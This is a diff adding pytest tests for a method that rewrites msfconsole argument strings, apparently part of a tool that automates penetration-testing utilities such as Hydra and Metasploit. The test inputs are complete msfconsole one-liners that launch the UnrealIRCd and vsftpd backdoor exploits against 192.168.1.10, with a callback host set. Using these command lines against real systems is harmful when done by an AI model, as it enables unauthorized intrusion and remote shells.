@@ -215,3 +215,36 @@ class TestHydraEndToEnd:
         notes = result.get("compatibility_notes", [])
         joined = " | ".join(notes)
         assert "黑名单" in joined or "rockyou" in joined.lower()
+
+
+# ═════════════════════════════════════════════════════════════
+# P14: msfconsole safety rewrite must not append payload after an early exit
+# ═════════════════════════════════════════════════════════════
+class TestMsfconsoleSafetyRewrite:
+    def test_existing_run_exit_is_reordered_after_payload_and_lport(self, executor):
+        args = "-q -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS 192.168.1.10; set RPORT 6667; set LHOST 192.168.1.2; run; exit'"
+        new_args, notes = executor._rewrite_msfconsole_args(args)
+
+        script = shlex.split(new_args)[2]
+        assert "; run" not in script.lower()
+        assert "set LPORT" in script
+        assert "set payload" in script
+        assert script.lower().endswith("exit -y")
+        assert script.lower().count("exit") == 1
+        lowered = script.lower()
+        exploit_idx = lowered.rindex("; exploit")
+        assert lowered.index("set lport") < exploit_idx < lowered.index("exit -y")
+        assert any("中间 `exit`" in n for n in notes)
+
+    def test_existing_exploit_exit_is_reordered_after_payload_and_lport(self, executor):
+        args = "-q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.1.10; set RPORT 21; exploit; exit'"
+        new_args, _notes = executor._rewrite_msfconsole_args(args)
+
+        script = shlex.split(new_args)[2]
+        assert "set LPORT" in script
+        assert "set payload" in script
+        assert script.lower().endswith("exit -y")
+        assert script.lower().count("exit") == 1
+        lowered = script.lower()
+        exploit_idx = lowered.rindex("; exploit")
+        assert lowered.index("set payload") < exploit_idx < lowered.index("exit -y")
